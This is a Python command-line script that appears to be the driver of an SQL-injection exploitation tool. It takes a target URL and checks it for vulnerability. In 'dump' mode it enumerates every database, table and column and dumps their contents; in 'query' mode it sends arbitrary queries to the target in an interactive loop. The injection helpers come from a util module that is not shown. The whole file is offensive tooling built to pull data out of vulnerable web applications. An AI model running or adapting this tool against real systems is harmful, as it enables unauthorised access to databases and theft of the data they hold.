from util.utils import is_vulnerable, get_target_info, get_all_db, get_db_table_schema,get_table_column, get_column_content, send_query
import logging
import argparse
import requests


parser = argparse.ArgumentParser(description="A script that stores target from command-line args")
parser.add_argument('-t', '--target', type=str, required=True, help='Target to be stored')
parser.add_argument('-m', '--mode', type=str, required=True, help='Mode to be used:  dump or query')
parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')

args = parser.parse_args()

if args.verbose:
    logging.basicConfig(level=logging.DEBUG,format='%(asctime)s - %(levelname)s - %(message)s')
else:
    logging.basicConfig(level=logging.INFO,format='%(asctime)s - %(levelname)s - %(message)s')


# Creating an object
logger = logging.getLogger()

def main():
    try:
        target = args.target
        vuln = is_vulnerable(target)
        logger.info("Is target vulnerable: {}".format(vuln))
        if not vuln:
            logger.info("Target is not vulnerable")
            return
        target_info = get_target_info(target)
        for key, value in target_info.items():
            logger.info("{}: {}".format(key, value))
    except requests.exceptions.MissingSchema as e:
        logger.error("Invalid target")
        exit(1)
    except requests.exceptions.ConnectionError as e:
        logger.error("Target is not reachable")
        exit(1)
    if args.mode == "dump":
        logger.info("Enumerating DBs...")
        databases = get_all_db(args.target)
        for db in databases:
            logger.info("Enumerating Database: {}".format(db))
            schemas = get_db_table_schema(args.target, db)
            for schema in schemas:
                logger.info("Enumerating Tables: {}".format(schema))
                table_columns = get_table_column(args.target, db, schema['TABLE_NAME'])
                for table_column in table_columns:
                    logger.info("Enumerating content of the Columns: {}".format(table_column))
                    get_column_content(args.target, db, schema['TABLE_SCHEMA'], schema['TABLE_NAME'], table_column, table_column)
    elif args.mode == "query":
        while True:
            query = input("Enter query: ")
            result = send_query(args.target, query)
            logger.info(result)

if __name__ == "__main__":
    main()

